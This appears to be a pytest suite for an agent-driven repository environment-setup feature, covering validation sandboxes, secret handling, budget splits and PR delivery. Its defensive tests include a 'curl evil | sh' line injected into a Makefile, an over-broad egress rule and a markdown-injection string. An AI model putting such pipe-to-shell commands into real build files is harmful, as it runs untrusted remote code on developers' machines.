"""Agent-led environment setup (autoinstall.py): end to end on the fake provider with scripted goal and
setup agents, a local git remote holding a small fixture repo (a Makefile and a pytest suite), and hangar's own
validation in a clean sandbox."""

from __future__ import annotations

import asyncio
import json
import os
import shutil
import signal
import subprocess
import sys
import tempfile
from pathlib import Path

import httpx
import pytest

from hangar import autoinstall, envbuilds, repoenv
from hangar.harnesses import HARNESSES, Harness
from hangar.jobs import Caller, JobError, JobService, SubmitJob
from hangar.models import CredentialKind, JobState
from tests.conftest import scratch_root
from tests.test_jobs import DONE, Hooks, _until

pytestmark = pytest.mark.skipif(not shutil.which("tmux") or not shutil.which("git") or not shutil.which("make"),
                                reason="needs tmux, git and make")

FIXTURE = Path(__file__).parent / "fixtures" / "autoinstall-repo"
GIT = ["git", "-c", "user.email=t@t", "-c", "user.name=t", "-c", "init.defaultBranch=main"]
PY = sys.executable  # has pytest: the fixture's suite runs with it (`make test PYTHON=...`)

# One script plays every agent: which one it is comes from its prompt. Retries and judgements are follow-ups whose
# prompts carry the original task too, so they are matched first.
AGENT = r"""#!/usr/bin/env bash
msg="$(cat "$HANGAR_PROMPT_FILE")"
mode=$(cat "$MODE_FILE" 2>/dev/null || echo ok)
echo "$msg" > "$HOME/last-prompt-$HANGAR_JOB_ID.txt"
good() {
  mkdir -p .hangar
  cat > .hangar/environment.yaml <<EOF
install: make install
verify: make test PYTHON=$PYBIN
terminals:
  - {name: serve, command: "touch .serving && sleep 300", ready: "test -f .serving"}
mocks:
  - {what: payments API, how: PAYMENTS_URL points at a local stub, why: no network in sandboxes}
EOF
  printf '# calc\n\n## Development environment\n\nmake install, make lint, make test. Payments: mocked.\n' >AGENTS.md
  git add -A && git commit -qm "env: $1"
}
report() {
  hangar-agent result "{\"commands\": [{\"name\": \"install\", \"works\": true}, {\"name\": \"lint\", \"works\": true},
    {\"name\": \"unit-tests\", \"works\": true}, {\"name\": \"serve\", \"works\": true},
    {\"name\": \"integration\", \"works\": false, \"blocked_by\": [\"API_TOKEN\"]}],
    \"mocks\": [{\"what\": \"payments API\", \"how\": \"a local stub\"}],
    \"secrets_needed\": [$1]}"
}
case "$msg" in
  *"Hangar validated your setup"*)
    case "$mode" in
      never) git commit -q --allow-empty -m "try again"; report "" ;;
      *) good "fixed"; report "" ;;
    esac ;;
  *"Hangar ran your proposed commands"*)
    hangar-agent result '{"verdicts": [{"name": "lint", "pass": true, "why": "it printed lint: ok"}]}' ;;
  *"first of two agents"*)
    [ "$mode" = "sleep" ] && sleep 60
    if [ "$mode" = "ask" ] && ! grep -q "use make" "$HANGAR_PROMPT_FILE"; then
      hangar-agent ask "Which build tool do you use?"; exit 0
    fi
    hangar-agent result "$(cat "$GOAL_FILE")" ;;
  *"so that these commands work"*)
    case "$mode" in
      ok|ask) good "setup"; report "" ;;
      slow) sleep 2; good "setup"; report "" ;;
      mockless)  # forgets to record its mock in the file: hangar sends it back
        mkdir -p .hangar
        printf 'install: make install\nverify: make test PYTHON=%s\n' "$PYBIN" > .hangar/environment.yaml
        git add -A && git commit -qm "env: no mocks"; report "" ;;
      secret) good "setup"
        hangar-agent env request secret API_TOKEN --why "integration tests call the API" || true
        report '{"name": "API_TOKEN", "why": "integration tests"}' ;;
      never) mkdir -p .hangar
        printf 'install: make install\nverify: make test-integration\nmocks: [{what: payments API, how: a stub}]\n' \
          > .hangar/environment.yaml
        git add -A && git commit -qm "env: wrong verify"; report "" ;;
    esac ;;
esac
echo '{"type":"result","result":"done"}'
"""


def goal(integration_core: bool = False) -> dict:
    return {"summary": "a make-based Python repo; CI runs make install, lint, test", "commands": [
        {"name": "install", "kind": "install", "command": "make install", "expect": "creates .deps", "core": True},
        {"name": "lint", "kind": "lint", "command": f"make lint PYTHON={PY}", "expect": "prints lint: ok",
         "core": True, "check_output": True},
        {"name": "unit-tests", "kind": "test", "command": f"make test PYTHON={PY}", "expect": "2 passed",
         "core": True},
        {"name": "serve", "kind": "start", "command": "python3 -m http.server", "expect": "keeps serving",
         "core": False},
        {"name": "integration", "kind": "test", "command": "make test-integration", "expect": "passes",
         "core": integration_core}],
        "services": [], "secrets": [{"name": "API_TOKEN", "why": "integration tests"}]}


@pytest.fixture
def world(monkeypatch):
    root = Path(tempfile.mkdtemp(prefix="auto-", dir=scratch_root()))
    remote, seed = root / "remote.git", root / "seed"
    subprocess.run([*GIT, "init", "-q", "--bare", str(remote)], check=True)
    shutil.copytree(FIXTURE, seed)
    subprocess.run([*GIT, "init", "-q", str(seed)], check=True)
    subprocess.run([*GIT, "-C", str(seed), "add", "."], check=True)
    subprocess.run([*GIT, "-C", str(seed), "commit", "-qm", "init"], check=True)
    subprocess.run([*GIT, "-C", str(seed), "push", "-q", str(remote), "HEAD:refs/heads/main"], check=True)
    subprocess.run(["git", "--git-dir", str(remote), "symbolic-ref", "HEAD", "refs/heads/main"], check=True)
    agent, mode, goal_file = root / "agent.sh", root / "mode", root / "goal.json"
    agent.write_text(AGENT)
    goal_file.write_text(json.dumps(goal()))
    monkeypatch.setitem(HARNESSES, "scripted", Harness(
        name="scripted", title="Scripted", run=f"MODE_FILE={mode} GOAL_FILE={goal_file} PYBIN={PY} bash {agent}"))
    envs = root / "envs"
    envs.mkdir()
    (envs / "autoenv.yaml").write_text("name: autoenv\nharnesses: [scripted]\n")
    yield {"root": root, "remote": remote, "mode": mode, "envs": envs, "url": f"file://{remote}", "goal": goal_file}
    shutil.rmtree(root, ignore_errors=True)


@pytest.fixture
async def jobs(fleet, world, settings, monkeypatch):
    from hangar import jobs as jobs_mod
    from hangar import landing
    from hangar.github import parse_repo
    from hangar.sessions import SessionService
    from hangar.vault import Vault

    settings.session_poll_seconds = 0.1
    settings.job_poll_seconds = 0.1
    settings.job_concurrency = 3
    fleet.catalog.dirs.insert(0, world["envs"])
    fleet.catalog.reload()
    # The fixture's remote is a local path; hangar treats it as o/r on GitHub, so the PR goes to the mock API.
    as_github = lambda r: "o/r" if r and r.startswith("file://") else parse_repo(r)  # noqa: E731
    monkeypatch.setattr(jobs_mod, "parse_repo", as_github)
    monkeypatch.setattr(landing, "parse_repo", as_github)
    sessions = SessionService(fleet, Vault(fleet.store, b"0" * 43 + b"="))
    await sessions.start()
    hooks = RefHooks(world["remote"])
    svc = JobService(fleet, sessions, transport=httpx.MockTransport(hooks))
    svc.hooks = hooks
    fleet.broker.put("gh", "git", CredentialKind.GIT_TOKEN, "ghp_x")
    settings.github_token_credential = "gh"

    async def resolve(host):
        return ["93.184.216.34"]

    svc.resolve = resolve
    await svc.start()
    yield svc
    await svc.stop()
    await sessions.stop()
    prov = fleet.providers["docker"]
    for p in prov.root.glob("*/home/agent/.hangar/svc/state.json"):  # supervisors the validations started
        try:
            os.kill(json.loads(p.read_text())["pid"], signal.SIGTERM)
        except (ProcessLookupError, ValueError, KeyError):
            pass
    for box in prov.boxes.values():
        subprocess.run(["tmux", "kill-server"], env={"TMUX_TMPDIR": f"{box}/tmp", "PATH": "/usr/bin:/bin"},
                       capture_output=True)


class RefHooks(Hooks):
    """--- integ3: the mock GitHub also answers `GET git/ref/heads/<branch>` from the local remote, so delivery can
    check that the branch is still at the commit hangar validated."""

    def __init__(self, remote: Path):
        super().__init__()
        self.remote = remote

    def __call__(self, request: httpx.Request) -> httpx.Response:
        p = request.url.path
        if request.url.host == "api.github.com" and "/git/ref/heads/" in p and request.method == "GET":
            self.calls.append(request)
            branch = p.split("/git/ref/heads/", 1)[1]
            sha = subprocess.run(["git", "--git-dir", str(self.remote), "rev-parse", f"refs/heads/{branch}"],
                                 capture_output=True, text=True).stdout.strip()
            return httpx.Response(200, json={"object": {"sha": sha}}) if sha else \
                httpx.Response(404, json={"message": "Not Found"})
        return super().__call__(request)


def submit(jobs: JobService, world, **kw) -> object:
    req = SubmitJob.model_validate(autoinstall.request(world["url"], environment="autoenv", **kw))
    return jobs.submit(req, Caller("sean", "sean"))


def children(jobs: JobService, parent_id: str) -> dict[str, object]:
    return {j.labels[autoinstall.ROLE_LABEL]: j for j in jobs._jobs.values()
            if j.labels.get(autoinstall.PARENT_LABEL) == parent_id}


def _remote_file(remote: Path, branch: str, path: str) -> str:
    return subprocess.run(["git", "--git-dir", str(remote), "show", f"{branch}:{path}"], capture_output=True,
                          text=True).stdout


async def test_goal_setup_validate_retry_and_pr(jobs, world, fleet):
    """The setup agent first forgets to record its mock in the file; hangar's validation sends it back with why;
    the second attempt validates (install, the supervisor's terminal, lint judged by the goal agent, the tests)
    and becomes a PR through the landing path, with the packet."""
    world["mode"].write_text("mockless")  # the retry (a follow-up turn) fixes it
    job = submit(jobs, world)
    assert job.labels[autoinstall.KIND_LABEL] == autoinstall.KIND
    job = await _until(jobs, job.id, DONE, timeout=90)
    events = [e.message for e in job.events]
    assert job.state == JobState.SUCCEEDED and job.reason is None, events
    st = autoinstall.load(job)
    assert st.stage == "done" and len(st.attempts) == 2
    first, second = st.attempts
    assert not first.ok and any("payments API" in e and "mocks" in e for e in first.config_errors), first
    assert second.ok and not second.partial
    assert second.install and second.install.verdict == "passed"
    assert second.services and second.services.verdict == "passed"  # the terminal was ready under the supervisor
    verdicts = {c.name: c for c in second.checks}
    assert verdicts["unit-tests"].verdict == "passed" and "2 passed" in verdicts["unit-tests"].tail
    assert verdicts["lint"].verdict == "passed" and verdicts["lint"].judged  # check_output: the goal agent judged
    assert verdicts["serve"].verdict == "skipped"  # a start command is the supervisor's terminal, not run
    assert "integration" not in verdicts  # not core and not claimed to work
    kids = children(jobs, job.id)
    goal_job, setup_job = kids["goal"], kids["setup"]
    assert goal_job.deliver == "none" and len(goal_job.turns) == 2  # the proposal, then the judgement
    assert st.models["_model"] == "frontier" == goal_job.model == setup_job.model  # --- integ3: one model module
    assert len(setup_job.turns) == 2 and setup_job.verify is None
    retry = setup_job.turns[1].message
    assert "Hangar validated your setup" in retry and "payments API" in retry
    # the budget is split so the two can't cross the env setup's
    b = job.job_budget
    assert b.max_cost_usd == jobs.settings.env_setup_max_cost_usd
    assert goal_job.job_budget.max_cost_usd + setup_job.job_budget.max_cost_usd == pytest.approx(b.max_cost_usd)
    assert goal_job.job_budget.max_turns + setup_job.job_budget.max_turns == b.max_turns
    # the PR: from the setup job's branch, ready for review, with the command table and the mock
    assert job.result.pr_url == "https://github.com/o/r/pull/7" == setup_job.result.pr_url
    pr = jobs.hooks.prs[-1]
    assert pr["head"] == setup_job.branch and pr["draft"] is False
    assert "## Environment setup" in pr["body"] and "`make install`" in pr["body"] and "payments API" in pr["body"]
    assert "the validated test command" in pr["body"]
    packet = next(c for c in jobs.hooks.comments() if "Review packet" in c)
    assert "**Environment setup:**" in packet and "mocked: `payments API`" in packet
    assert f"validated `{second.head_sha[:12]}`" in packet and second.head_sha == setup_job.result.head_sha
    cfg = repoenv.parse(_remote_file(world["remote"], setup_job.branch, repoenv.PATH))
    assert cfg.verify == f"make test PYTHON={PY}" and cfg.mocks[0].what == "payments API"
    assert "Development environment" in _remote_file(world["remote"], setup_job.branch, "AGENTS.md")
    # the validation sandboxes were clean (no repo build, after_setup skipped) and are gone
    left = [s for s in fleet.list(include_stopped=True) if envbuilds.VALIDATE_LABEL in s.labels]
    assert len(left) == 2 and all(s.state in ("stopped", "failed") for s in left), [s.state for s in left]
    assert all(not (s.info.get("env_build") or {}).get("image") for s in left)
    assert not fleet.store.kv_keys(autoinstall.KV_VALIDATE)
    # the goal agent read the CI workflow's hint, and the setup agent was told the commands and the rules
    prompt = setup_job.instructions
    assert "`make test PYTHON=" in prompt and "hangar-agent env request secret" in prompt and "mocks" in prompt


async def test_missing_secret_opens_a_draft_listing_it(jobs, world):
    """A core command that needs a real secret is blocked, not faked: the PR opens as a draft and says which
    secrets are still needed."""
    world["goal"].write_text(json.dumps(goal(integration_core=True)))
    world["mode"].write_text("secret")
    job = await _until(jobs, submit(jobs, world).id, DONE, timeout=90)
    assert job.state == JobState.SUCCEEDED and job.reason == "secrets_needed", [e.message for e in job.events]
    st = autoinstall.load(job)
    att = st.attempts[-1]
    assert att.ok and att.partial and len(st.attempts) == 1
    assert {c.name: c.verdict for c in att.checks}["integration"] == "blocked"
    assert [s.name for s in st.secrets_needed] == ["API_TOKEN"]
    pr = jobs.hooks.prs[-1]
    assert pr["draft"] is True and "Secrets still needed" in pr["body"] and "`API_TOKEN`" in pr["body"]
    assert "Secrets still needed: API_TOKEN" in job.result.summary


async def test_retries_run_out_and_say_whats_missing(jobs, world):
    jobs.settings.env_setup_retries = 1
    world["mode"].write_text("never")
    job = await _until(jobs, submit(jobs, world).id, DONE, timeout=90)
    assert job.state == JobState.FAILED and job.reason == "setup_failed", [e.message for e in job.events]
    st = autoinstall.load(job)
    assert len(st.attempts) == 2 and not jobs.hooks.prs
    assert any("make test-integration" in m and "exit 2" in m for m in st.missing), st.missing
    assert "What's missing" in job.result.summary and "Spent $" in job.result.summary
    assert len(children(jobs, job.id)["setup"].turns) == 2  # one retry, with the output
    with pytest.raises(JobError, match="run `hangar env setup"):
        jobs.follow_up(job.id, "try again", requester="sean")


async def test_an_agents_question_waits_on_the_env_setup_and_its_answer_goes_through(jobs, world):
    world["mode"].write_text("ask")
    job = submit(jobs, world)
    job = await _until(jobs, job.id, {JobState.NEEDS_INPUT, *DONE}, timeout=60)
    assert job.state == JobState.NEEDS_INPUT and "Which build tool" in job.result.question, \
        [e.message for e in job.events]
    jobs.follow_up(job.id, "use make", requester="sean")
    goal_job = children(jobs, job.id)["goal"]
    assert goal_job.turns[-1].message == "use make" and job.state == JobState.RUNNING
    job = await _until(jobs, job.id, DONE, timeout=90)
    assert job.state == JobState.SUCCEEDED and job.result.question is None, [e.message for e in job.events]
    with pytest.raises(JobError, match="already|still"):  # one env setup of a repo at a time
        submit(jobs, world)
        submit(jobs, world)


async def test_cancel_stops_the_agents(jobs, world):
    world["mode"].write_text("sleep")
    job = submit(jobs, world)
    while not (g := children(jobs, job.id).get("goal")) or not g.turns[0].run_id:
        await asyncio.sleep(0.05)
    jobs.cancel(job.id, requester="sean")
    job = await _until(jobs, job.id, DONE, timeout=20)
    assert job.state == JobState.CANCELLED
    g = await _until(jobs, g.id, DONE, timeout=20)
    assert g.state == JobState.CANCELLED and "setup" not in children(jobs, job.id)


async def test_a_restart_mid_setup_picks_up_where_it_was(jobs, world, fleet):
    """#75: the work isn't tied to the runner. The control plane stops while the setup agent works; the next one
    finds the env setup in its job record and carries on with the same goal and setup jobs."""
    world["mode"].write_text("slow")
    job = submit(jobs, world)
    while not (s := children(jobs, job.id).get("setup")) or not s.turns[0].run_id:
        await asyncio.sleep(0.05)
    await jobs.stop()
    again = JobService(fleet, jobs.sessions, transport=jobs.transport)
    again.hooks = jobs.hooks
    await again.start()
    try:
        done = await _until(again, job.id, DONE, timeout=90)
        assert done.state == JobState.SUCCEEDED, [e.message for e in done.events]
        st = autoinstall.load(done)
        assert st.setup_job == s.id and len(st.attempts) == 1 and done.result.pr_url
        assert len([j for j in again._jobs.values() if j.labels.get(autoinstall.PARENT_LABEL) == job.id]) == 2
    finally:
        await again.stop()


async def test_an_issue_labelled_for_env_setup_starts_one(jobs, world):
    from hangar.jobs import handle_github

    jobs.settings.github_repos = {"o/r": "autoenv"}
    jobs.settings.github_trusted = ["sean"]
    issue = {"number": 5, "title": "Set up hangar for this repo", "body": "we use make", "labels": [
        {"name": "hangar-env-setup"}], "user": {"login": "sean"}, "author_association": "OWNER"}
    res = await handle_github(jobs, "issues", "d-1", {"action": "labeled", "label": {"name": "hangar-env-setup"},
                                                      "repository": {"full_name": "o/r"}, "issue": issue,
                                                      "sender": {"login": "sean"}})
    job = jobs.get(res["job"])
    assert autoinstall.is_setup(job) and job.repo == "https://github.com/o/r.git", res
    jobs.cancel(job.id, requester="sean")
    await _until(jobs, job.id, DONE)


async def test_rest_starts_an_env_setup(jobs, world):
    from types import SimpleNamespace

    from fastapi import Depends, FastAPI

    app = FastAPI()
    autoinstall.mount(app, SimpleNamespace(jobs=jobs), Depends(lambda: Caller("sean", "sean")))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://h") as c:
        r = await c.post("/api/env/setup", json={"repo": world["url"], "environment": "autoenv", "notes": "skip docs",
                                                 "mode": "drift", "job_budget": {"max_cost_usd": 5}})
        assert r.status_code == 200, r.text
        j = r.json()
        assert j["labels"] == {autoinstall.KIND_LABEL: autoinstall.KIND, autoinstall.MODE_LABEL: "drift"}
        assert j["instructions"] == "skip docs" and j["job_budget"]["max_cost_usd"] == 5
        assert (await c.post("/api/env/setup", json={"repo": world["url"], "mode": "nope"})).status_code == 422
    await _until(jobs, j["id"], DONE)


async def test_the_validation_sandbox_gets_the_proposed_services(fleet):
    from hangar import envservices
    from hangar.models import Sandbox

    spec = fleet.catalog.get(fleet.catalog.names()[0])
    nonce = "ab" * 16
    fleet.store.kv_set(autoinstall.KV_VALIDATE + nonce, repoenv.parse(
        "services: {redis: {image: 'redis:7', port: 6379}}\n").model_dump_json())
    sb = Sandbox(name="v", environment=spec.name, provider="docker", repo="https://github.com/o/r.git",
                 labels={envbuilds.VALIDATE_LABEL: nonce})
    envservices.prepare(fleet, spec, sb, None)
    assert set(sb.info["service_specs"]) == {"redis"}
    forged = Sandbox(name="w", environment=spec.name, provider="docker", labels={envbuilds.VALIDATE_LABEL: "x"})
    envservices.prepare(fleet, spec, forged, None)  # a label someone set by hand names no proposal
    assert "service_specs" not in forged.info or set(forged.info["service_specs"]) == set(spec.services)


async def test_drift_run_with_nothing_to_do_spends_nothing(jobs, world, fleet):
    key = envbuilds.repo_key(world["url"])
    fleet.store.kv_set(f"{envbuilds.KV_SEEN}autoenv:{key}", envbuilds.Seen(
        commit="abc", present=True, config={"install": "make install"}).model_dump_json())
    job = await _until(jobs, submit(jobs, world, mode="drift").id, DONE)
    assert job.state == JobState.SUCCEEDED and job.reason == "no_changes"
    assert "Nothing to do" in job.result.summary and not children(jobs, job.id)


# ---------------------------------------------------------------------- units
async def test_submit_needs_a_repo_and_one_attempt(jobs, world):
    with pytest.raises(JobError, match="needs a repo"):
        jobs.submit(SubmitJob(instructions="x", environment="autoenv",
                              labels={autoinstall.KIND_LABEL: autoinstall.KIND}), Caller("sean", "sean"))
    with pytest.raises(JobError, match="best_of_n"):
        jobs.submit(SubmitJob.model_validate({**autoinstall.request(world["url"], environment="autoenv"),
                                              "strategy": "best_of_n", "n": 2}), Caller("sean", "sean"))


def test_kind_from_an_issue_label(settings):
    assert autoinstall.kind_labels(settings, ["bug", "hangar-env-setup"]) == {"hangar.kind": "env-setup"}
    assert autoinstall.kind_labels(settings, ["hangar"]) == {}


def test_goal_defaults_core_and_refuses_duplicates():
    g = autoinstall.Goal.model_validate({"commands": [
        {"name": "deps", "kind": "install", "command": "npm ci"}, {"name": "unit", "kind": "test", "command": "x"},
        {"name": "lint", "kind": "lint", "command": "y"}]})
    assert [c.core for c in g.commands] == [True, True, False]
    with pytest.raises(ValueError, match="unique"):
        autoinstall.Goal.model_validate({"commands": [{"name": "a", "command": "x"}, {"name": "a", "command": "y"}]})
    with pytest.raises(ValueError):
        autoinstall.Goal.model_validate({"commands": [{"name": "Bad Name", "command": "x"}]})


def test_verdict_rules():
    C, A = autoinstall.Check, autoinstall.Attempt
    ok = A(n=1, install=C(name="install", kind="install", command="i", verdict="passed"),
           checks=[C(name="t", kind="test", command="t", core=True, verdict="passed")])
    autoinstall._verdict(ok)
    assert ok.ok and not ok.partial
    part = A(n=1, checks=[C(name="t", kind="test", command="t", core=True, verdict="passed"),
                          C(name="it", kind="test", command="it", core=True, verdict="blocked")])
    autoinstall._verdict(part)
    assert part.ok and part.partial
    bad = A(n=1, checks=[C(name="t", kind="test", command="t", core=True, verdict="failed", why="exit 1")])
    autoinstall._verdict(bad)
    assert not bad.ok and "`t` exit 1" in bad.failure
    blocked_install = A(n=1, install=C(name="install", kind="install", command="i", verdict="blocked", why="x"))
    autoinstall._verdict(blocked_install)
    assert not blocked_install.ok and "blocked by missing secrets" in blocked_install.failure


def test_proposal_needs_verify_and_every_reported_mock():
    st = autoinstall.State(goal=autoinstall.Goal.model_validate(goal()),
                           report=autoinstall.SetupReport(mocks=[repoenv.Mock(what="S3", how="MinIO")]))
    errs = autoinstall._proposal_errors(st, repoenv.parse("install: make install\n"))
    assert any(e.startswith("verify: unset") and "make test" in e for e in errs)
    assert any("'S3'" in e for e in errs)
    ok = repoenv.parse("verify: make test\nmocks:\n  - {what: s3, how: MinIO at minio:9000}\n")
    assert autoinstall._proposal_errors(st, ok) == []


def test_mocks_are_part_of_the_file_but_not_the_build():
    a = repoenv.parse("install: make\n")
    b = repoenv.parse("install: make\nmocks:\n  - {what: S3, how: MinIO, why: no cloud}\n")
    assert repoenv.digest(a, "") == repoenv.digest(b, "")  # a recorded mock doesn't rebuild
    assert repoenv.parse(repoenv.dump(b)).mocks[0].why == "no cloud"
    with pytest.raises(repoenv.RepoEnvError, match="not a field"):
        repoenv.parse("mocks:\n  - {what: S3, how: x, secret: y}\n")


async def test_packet_lines_only_for_the_setup_job(jobs, world):
    from hangar.models import Job

    parent = Job(title="env setup", instructions="x", environment="autoenv", repo=world["url"],
                 labels={autoinstall.KIND_LABEL: autoinstall.KIND})
    labels = {autoinstall.PARENT_LABEL: parent.id, autoinstall.ROLE_LABEL: "setup"}
    child = Job(title="setup", instructions="x", environment="autoenv", repo=world["url"], labels=labels)
    st = autoinstall.State(attempts=[autoinstall.Attempt(n=1, ok=True, checks=[autoinstall.Check(
        name="unit-tests", kind="test", command="make test", verdict="passed")])],
        config={"mocks": [{"what": "S3", "how": "MinIO"}]},
        secrets_needed=[autoinstall.SecretNeed(name="API_TOKEN")], goal_job="job-g", setup_job=child.id)
    parent.result.data = st.model_dump(mode="json")
    jobs._jobs[parent.id] = parent
    lines = "\n".join(autoinstall.packet_lines(jobs, child))
    assert "1 of 1 check(s) passed" in lines and "mocked: `S3` (`MinIO`)" in lines and "`API_TOKEN`" in lines
    assert autoinstall.packet_lines(jobs, parent) == []
    # labels are anyone's to write: a job that only claims to be the setup job gets nothing of the env setup's
    other = Job(title="mine", instructions="x", environment="autoenv", repo=world["url"], labels=dict(labels))
    assert autoinstall.packet_lines(jobs, other) == []



# ---------------------------------------------------------------------- review #102
async def test_the_validation_sandbox_holds_no_secrets_only_what_the_clone_needs(fleet, world):
    """The validation sandbox runs an unmerged, agent-written install: it gets the git credential the clone needs
    and nothing else the environment carries (its other credentials, its `secrets:` mappings, cloud tokens)."""
    fleet.broker.put("gh", "git", CredentialKind.GIT_TOKEN, "ghp_clone")
    fleet.broker.put("npm", "custom", CredentialKind.GENERIC, "npm_SECRET", env_var="NPM_TOKEN")
    fleet.broker.put("db", "custom", CredentialKind.GENERIC, "db_SECRET", env_var="UNUSED")
    (world["envs"] / "credenv.yaml").write_text(
        "name: credenv\nharnesses: [scripted]\ncredentials: [gh, npm]\nsecrets: {DB_PASSWORD: db}\n")
    fleet.catalog.dirs.insert(0, world["envs"])
    fleet.catalog.reload()
    spec = fleet.catalog.get("credenv")
    assert autoinstall.validation_credentials(fleet, spec) == ["gh"]
    prov = fleet.providers["docker"]
    sb = await fleet.create("credenv", credentials=["gh", "npm"], labels={envbuilds.VALIDATE_LABEL: "ab" * 16})
    env = (await prov.read_file(sb, "/home/agent/.hangar/env") or b"").decode()
    assert "npm_SECRET" not in env and "db_SECRET" not in env, env
    plain = await fleet.create("credenv", credentials=["gh", "npm"])  # the label is what takes them away
    env = (await prov.read_file(plain, "/home/agent/.hangar/env") or b"").decode()
    assert "npm_SECRET" in env and "db_SECRET" in env


def test_the_validation_sandbox_goes_through_the_gateway_like_a_jobs(fleet):
    """With the git gateway on for jobs, the validation sandbox gets a scoped grant, not the git token."""
    from hangar.models import Sandbox

    fleet.settings.gateway_url, fleet.settings.gateway_for_jobs = "https://gw.example", True
    spec = fleet.catalog.get(fleet.catalog.names()[0]).model_copy(update={"credential_mode": None})
    sb = Sandbox(name="v", environment=spec.name, provider="docker", labels={envbuilds.VALIDATE_LABEL: "ab" * 16})
    assert fleet.gateway.mode_for(spec, sb, None) == "gateway"
    assert fleet.gateway.mode_for(spec, Sandbox(name="p", environment=spec.name, provider="docker"), None) == \
        "direct"


@pytest.mark.parametrize("field", ["image: evil:latest", "credentials: [gh]", "secrets: {X: gh}",
                                   "egress: {allow: ['*']}", "cloud: {gcp: {}}", "harnesses: [codex]",
                                   "resources: {cpus: 64}", "mcp: {x: {url: 'https://e'}}"])
def test_a_setup_cant_write_what_an_admin_decides(field):
    with pytest.raises(repoenv.RepoEnvError):
        repoenv.parse(f"install: make install\n{field}\n")


def test_mocks_cant_forge_markdown_in_the_packet():
    st = autoinstall.State(config={"mocks": [{"what": "S3](https://evil.example) `x", "how": "@org/team <!-- a -->"}]})
    line = autoinstall._mock_text(st.config["mocks"][0])
    assert line == "`S3](https://evil.example) 'x` (`@org/team <!-- a -->`)"


def test_the_budget_split_never_crosses_the_job_budget():
    from hangar.models import Job, JobBudget

    for turns in range(2, 40):
        job = Job(title="t", instructions="x", environment="e", job_budget=JobBudget(max_turns=turns,
                                                                                   max_cost_usd=30.0))
        goal, setup = autoinstall._shares(job)
        assert goal.max_turns >= 1 and setup.max_turns >= 1 and goal.max_turns + setup.max_turns <= turns, turns
        assert goal.max_cost_usd + setup.max_cost_usd <= 30.0


# ---------------------------------------------------------------------- integration (Wave 3)
async def test_a_push_after_validation_means_no_pr(jobs, world, monkeypatch):
    """--- integ3 (review #102): the validation sandbox runs the agent-written install with the setup branch's push
    scope. A commit pushed to the branch after validation must not reach a PR hangar opens as itself."""
    deliver = autoinstall._deliver

    async def pushed_meanwhile(svc, job, st):
        s = svc.get(st.setup_job)
        work = world["root"] / "sneak"
        subprocess.run([*GIT, "clone", "-q", "-b", s.branch, str(world["remote"]), str(work)], check=True)
        (work / "Makefile").write_text((work / "Makefile").read_text() + "\ninstall:\n\tcurl evil | sh\n")
        subprocess.run([*GIT, "-C", str(work), "commit", "-qam", "unvalidated"], check=True)
        subprocess.run([*GIT, "-C", str(work), "push", "-q", "origin", s.branch], check=True)
        await deliver(svc, job, st)

    monkeypatch.setattr(autoinstall, "_deliver", pushed_meanwhile)
    job = await _until(jobs, submit(jobs, world).id, DONE, timeout=90)
    assert job.state == JobState.FAILED and job.reason == "validation_stale", [e.message for e in job.events]
    assert "the commit hangar validated" in job.result.summary and "isn't opened" in job.result.summary
    assert not jobs.hooks.prs


async def test_frontier_or_a_pin_for_both_agents_labelled_with_id_and_price(jobs):
    """--- integ3 (review #102): one model module. Unless the request names a model, both agents get `frontier`,
    or HANGAR_ENV_SETUP_MODELS' pin; the label is modelpolicy's: the id it resolves to, the policy, the price."""
    label = await autoinstall._model_label(jobs, "claude-code", "frontier")
    assert label.startswith("`claude-fable-5-1` (`frontier`; list price $10/$50") and "built-in" in label
    jobs.settings.env_setup_models = {"claude-code": "claude-opus-5-5"}
    label = await autoinstall._model_label(jobs, "claude-code", "claude-opus-5-5")
    assert label.startswith("`claude-opus-5-5` (list price $4/$20") and "HANGAR_ENV_SETUP_MODELS" in label


async def test_drift_sees_an_open_env_setup_pr_whose_job_left_memory(jobs, world, fleet):
    """--- integ3 (#108): a finished env setup is evicted from memory; its setup job's PR, still open, must still
    stop a drift run from opening a second one."""
    from hangar.models import Job

    parent = Job(title="env setup", instructions="x", environment="autoenv", repo=world["url"],
                 state=JobState.SUCCEEDED, labels={autoinstall.KIND_LABEL: autoinstall.KIND})
    child = Job(title="setup", instructions="x", environment="autoenv", repo=world["url"], state=JobState.SUCCEEDED,
                labels={autoinstall.PARENT_LABEL: parent.id, autoinstall.ROLE_LABEL: "setup"})
    child.result.pr_url, child.landing.pr_state = "https://github.com/o/r/pull/9", "open"
    parent.result.data = autoinstall.State(stage="done", setup_job=child.id).model_dump(mode="json")
    fleet.store.put(parent)
    fleet.store.put(child)
    assert jobs._jobs.peek(parent.id) is None  # in the store only, as after an eviction
    drift = Job(title="drift", instructions="x", environment="autoenv", repo=world["url"],
                labels={autoinstall.KIND_LABEL: autoinstall.KIND})
    why, fine = autoinstall.drift_reason(jobs, drift)
    assert why is None and "pull/9" in fine and "still open" in fine
